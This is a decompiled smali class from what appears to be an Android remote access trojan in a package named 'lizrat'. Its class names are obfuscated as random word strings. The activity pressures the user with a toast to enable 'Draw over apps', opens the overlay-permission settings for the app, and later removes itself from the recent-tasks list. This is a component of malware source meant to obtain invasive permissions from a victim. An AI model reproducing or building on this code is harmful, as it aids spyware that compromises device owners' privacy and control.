.class public LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;
.super Landroid/app/Activity;
.source "refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    const/4 v0, 0x0

    .line 119
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->shown:Ljava/lang/Boolean;

    .line 120
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 121
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 124
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 73
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    if-nez p1, :cond_1

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    .line 79
    invoke-virtual {p0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->finish()V

    goto :goto_0

    :cond_0
    if-nez p2, :cond_1

    .line 82
    invoke-virtual {p0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->finish()V

    :cond_1
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 16
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 23
    :try_start_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_1

    .line 24
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 25
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Enable Draw over apps For : "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v0, 0x7f070001

    invoke-virtual {p0, v0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x1

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 27
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/4 v0, 0x0

    .line 28
    invoke-virtual {p0, p1, v0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    .line 32
    :cond_0
    invoke-virtual {p0}, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method
